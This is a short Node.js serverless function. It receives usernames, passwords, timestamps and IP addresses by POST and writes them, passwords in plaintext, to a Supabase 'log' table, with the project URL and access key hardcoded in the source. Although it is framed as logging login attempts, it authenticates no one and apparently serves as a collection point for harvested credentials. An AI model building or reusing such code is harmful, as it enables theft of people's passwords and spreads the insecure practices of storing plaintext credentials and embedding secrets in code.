const { createClient } = require('@supabase/supabase-js');

const supabaseUrl = 'https://yayrbsvafizrldmkxtvj.supabase.co';
const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InlheXJic3ZhZml6cmxkbWt4dHZqIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MTg0MTU0NDUsImV4cCI6MjAzMzk5MTQ0NX0.alW7sPzJLaJA_V9Ou4H7QtVotfpJQY9xqIplpr7gN4Q';
const supabase = createClient(supabaseUrl, supabaseKey);

module.exports = async (req, res) => {
  if (req.method !== 'POST') {
    res.status(405).send({ error: 'Method not allowed' });
    return;
  }

  const { username, password, time, ip } = req.body;

  try {
    const { data, error } = await supabase
      .from('log')
      .insert([{ username, pass: password, time, ip }]);

    if (error) {
      console.error('Error logging login attempt:', error);
      res.status(500).json({ error: error.message });
    } else {
      res.status(200).json({ data });
    }
  } catch (err) {
    console.error('Fetch error:', err);
    res.status(500).json({ error: 'Fetch error' });
  }
};
